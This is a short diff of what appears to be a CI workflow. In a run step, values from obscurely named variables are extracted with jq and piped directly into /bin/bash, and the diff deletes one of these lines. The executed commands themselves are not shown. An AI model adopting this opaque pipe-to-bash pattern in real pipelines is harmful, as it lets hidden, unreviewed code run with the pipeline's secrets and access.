@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$gehta4074" | jq -r .vp316 | /bin/bash
           echo $evyd66 | jq -r .rh30 | /bin/bash
-          echo $odsbf6402 | jq -r .zzle606 | /bin/bash
           echo $e2608 | jq -r .cz33 | /bin/bash
 
       - name: Persist results
